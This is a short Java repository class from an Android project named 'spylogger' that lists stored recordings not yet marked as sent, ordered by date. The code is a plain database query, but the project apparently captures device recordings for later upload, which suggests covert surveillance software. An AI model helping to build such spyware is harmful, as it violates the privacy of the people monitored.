package com.gravatasufoca.spylogger.repositorio.impl;


import android.content.Context;

import com.gravatasufoca.spylogger.model.Gravacao;
import com.gravatasufoca.spylogger.repositorio.RepositorioGenerico;
import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;

import java.sql.SQLException;
import java.util.Collections;
import java.util.List;


public class RepositorioGravacaoImpl extends RepositorioGenerico<Gravacao> implements RepositorioGravacao {

	private Context context;
	public RepositorioGravacaoImpl(Context context) throws SQLException {
		super(context);
	}

	public Context getContext() {
		return context;
	}


	@Override
	public List<Gravacao> listarNaoEnviados() {
		try {
			List<Gravacao> tmp=database.queryBuilder().orderBy("data", true).where().eq("enviado", false).query();

			return tmp;
		} catch (SQLException e) {
			return Collections.emptyList();
		}
	}



}
